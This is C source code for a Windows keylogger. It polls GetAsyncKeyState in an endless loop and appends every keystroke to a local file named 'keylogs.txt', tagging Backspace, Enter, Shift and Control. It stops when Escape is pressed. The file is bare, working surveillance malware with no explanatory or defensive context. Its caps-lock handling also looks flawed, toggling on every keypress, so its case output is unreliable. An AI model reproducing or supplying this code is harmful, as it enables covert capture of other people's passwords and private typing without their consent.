#include <windows.h>
#include <stdio.h>
#include <ctype.h>

int main()
{
    int c;
    int isCapslock = 0;
    FILE *file;
    file = fopen("keylogs.txt", "a+");

    while (1)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                if (GetKeyState(VK_CAPITAL) & 0x0001)
                {
                    isCapslock = !isCapslock;
                }
                if ((c >= 65) && (c <= 90))
                {
                    if (isCapslock || GetKeyState(VK_SHIFT) & 0x8000)
                    {
                        fputc(c, file);
                    }
                    else
                    {
                        c = tolower(c);
                        fputc(c, file);
                    }
                }
                else
                {
                    switch (c)
                    {
                    case VK_BACK:
                        fprintf(file, "[BACKSPACE]");
                        break;
                    case VK_RETURN:
                        fprintf(file, "\n");
                        break;
                    case VK_SPACE:
                        fprintf(file, " ");
                        break;
                    case VK_SHIFT:
                        fprintf(file, "[SHIFT]");
                        break;
                    case VK_CONTROL:
                        fprintf(file, "[CONTROL]");
                        break;
                    default:
                        break;
                    }
                }
                fflush(file);
            }
        }
        if (GetAsyncKeyState(VK_ESCAPE) == -32767)
        {
            fclose(file);
            return 0;
        }
    }
    fclose(file);
    return 0;
}
